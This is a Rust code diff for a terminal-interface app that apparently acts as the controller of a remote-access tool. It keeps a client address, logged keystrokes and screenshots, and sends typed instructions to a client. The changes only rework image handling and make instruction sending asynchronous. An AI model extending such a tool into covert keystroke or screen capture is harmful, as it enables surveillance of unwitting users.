@@ -1,9 +1,6 @@
 use crate::server::{ClientHandle, spawn_client};
-use image::ImageReader;
-use ratatui_image::{
-    protocol::StatefulProtocol,
-    picker::Picker,
-};
+use color_eyre::eyre::Ok;
+use ratatui_image::thread::ThreadProtocol;
 
 pub struct TabsState<'titles> {
     pub titles: Vec<&'titles str>,
@@ -37,15 +34,12 @@ pub struct App<'title> {
     pub instructions: Vec<String>,
     pub client_addr: String,
     pub logged_keys: String,
-    pub screenshot: StatefulProtocol,
+    pub screenshot: ThreadProtocol,
     pub client: ClientHandle,
 }
 
 impl<'title> App<'title> {
-    pub fn new(title: &'title str) -> Self {
-        let protocol = Picker::from_query_stdio().unwrap()
-            .new_resize_protocol(ImageReader::open("D:/фото/DSCN4215.jpg").unwrap().decode().unwrap());
-
+    pub fn new(title: &'title str, protocol: ThreadProtocol) -> Self {
         Self {
             title,
             input: String::new(),
@@ -114,12 +108,16 @@ impl<'title> App<'title> {
         self.character_index = 0;
     }
 
-    pub fn submit_instructions(&mut self) {
-        if self.client.app_sender.blocking_send(
-            self.input.clone().as_bytes().to_vec()
-        ).is_err() {
-            return;
-        }
+    pub async fn submit_instructions(&mut self) {
+        let app_sender_clone = self.client.app_sender.clone();
+        let input_clone = self.input.clone();
+
+        tokio::spawn(async move {
+            app_sender_clone.send(
+                input_clone.as_bytes().to_vec()
+            ).await?;
+            Ok(())
+        });
 
         self.instructions.push(self.input.clone());
         self.input.clear();
